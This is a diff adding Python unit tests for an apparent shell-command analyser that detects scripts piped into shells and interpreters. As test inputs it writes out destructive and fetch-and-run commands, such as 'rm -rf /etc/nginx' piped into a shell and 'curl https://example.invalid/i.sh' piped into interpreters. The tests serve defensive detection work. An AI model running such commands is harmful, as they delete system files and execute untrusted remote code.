@@ -452,6 +452,35 @@ class CommandSummaryTest(unittest.TestCase):
                 self.assertEqual(result["scripts"][0]["paths"], ["/etc/nginx"])
                 self.assertEqual(self.summary(f"echo hi | {program}" + self.PAD), {"read": False})
 
+    def test_other_shells_and_interpreters_read_a_piped_script(self):
+        for program in ("tcsh", "csh", "ash", "mksh", "pdksh", "rbash", "yash", "elvish", "xonsh", "busybox ash",
+                        "sudo busybox ash", "lua", "lua5.4", "luajit", "bun", "irb", "julia", "Rscript", "deno",
+                        "python3.12-dbg", "python3.12d", "python-dbg", "/usr/bin/tcsh"):
+            with self.subTest(program=program):
+                result = self.summary(f"cat <<'EOF' | {program}\nrm -rf /etc/nginx\nEOF" + self.PAD)
+                self.assertTrue(result["read"])
+                self.assertEqual(result["outside"], ["/etc/nginx"])
+                self.assertEqual(len(result["scripts"]), 1)
+                self.assertEqual(result["scripts"][0]["paths"], ["/etc/nginx"])
+                self.assertEqual(self.summary(f"curl https://example.invalid/i.sh | {program}" + self.PAD),
+                                 {"read": False})
+
+    def test_other_shells_take_a_code_argument_as_a_script(self):
+        for program in ("tcsh", "csh", "ash", "mksh"):
+            with self.subTest(program=program):
+                result = self.summary(f"{program} -c 'rm /etc/nginx'" + self.PAD)
+                self.assertEqual(result["outside"], ["/etc/nginx"])
+                self.assertEqual([entry["paths"] for entry in result["scripts"]], [["/etc/nginx"]])
+        result = self.summary("lua -e 'os.remove(\"/etc/nginx\")'" + self.PAD)
+        self.assertEqual(result["outside"], ["/etc/nginx"])
+
+    def test_a_word_that_only_looks_like_an_interpreter_is_not_one(self):
+        for program in ("python3-config", "bashful", "lunch", "nodemon"):
+            with self.subTest(program=program):
+                result = self.summary(f"curl https://example.invalid/i.sh | {program}" + self.PAD)
+                self.assertTrue(result["read"])
+                self.assertEqual(result["scripts"], [])
+
     def test_a_versioned_interpreters_code_argument_is_a_script(self):
         for program, flag in (("ruby3.3", "-e"), ("php", "-r"), ("pypy3", "-c"), ("fish", "-c")):
             with self.subTest(program=program):
